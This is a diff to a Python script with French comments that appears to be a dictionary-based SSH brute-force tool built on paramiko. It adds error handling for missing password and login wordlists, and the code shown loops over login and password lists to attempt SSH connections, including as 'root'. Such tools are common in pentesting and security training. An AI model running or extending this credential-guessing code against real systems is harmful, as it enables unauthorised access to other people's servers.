@@ -37,7 +37,7 @@ if sys.argv[1] == "ssh": #fonction faire des requet ssh avec la ligne du dico
     def requet_ssh(password, login):        
         # A voir ce que fait la ligne avant
         ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        try:
+        try: # Ligne de tentative de connection
             ssh_client.connect(hostname=url, username=login, password=password, auth_timeout=0.5)
 
         except:
@@ -67,7 +67,11 @@ else :
 
 # On lis ligne par ligne si il y a un dictionnaire
 if Nb_Arg >= 3 :
-    passdico = open(sys.argv[3]).read().splitlines()
+    try :
+        passdico = open(sys.argv[3]).read().splitlines()
+    except : 
+        print ("le dictionnaire non lisible ou n'existe pas")
+        quit()
 
 # Verifie si y a un dico de password
 if Nb_Arg <= 2: 
@@ -83,15 +87,13 @@ if Nb_Arg == 3 :
             requet_ssh(password,"root") # appel de fonction request ssh
 
 
-
-
-
-
 # Si il y a un dictionnaire de login
 if Nb_Arg >= 4 :
-    
-
-    logdico = open(sys.argv[4]).read().splitlines()
+    try :
+        logdico = open(sys.argv[4]).read().splitlines()
+    except :
+        print("'le dictionnaire n'existe pas ou n'est pas lisible")
+        quit()
     for login in logdico :
         for password in passdico :            
             if sys.argv[1] == "ssh":
